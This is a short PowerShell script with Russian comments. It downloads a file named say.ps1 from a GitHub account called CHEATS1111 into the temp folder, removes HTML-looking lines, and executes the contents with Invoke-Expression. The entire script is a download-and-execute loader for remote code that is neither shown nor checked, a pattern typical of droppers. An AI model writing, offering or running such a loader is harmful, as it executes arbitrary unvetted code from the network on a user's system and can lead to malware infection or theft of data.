$temp = "$env:TEMP\say.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CHEATS1111/d/main/say.ps1" -OutFile $temp

# Очистка BOM и лишнего HTML (если есть)
(Get-Content $temp) | Where-Object { $_ -notmatch '<.*>' } | Set-Content $temp -Encoding ASCII

# Запуск
Invoke-Expression -Command (Get-Content $temp -Raw)
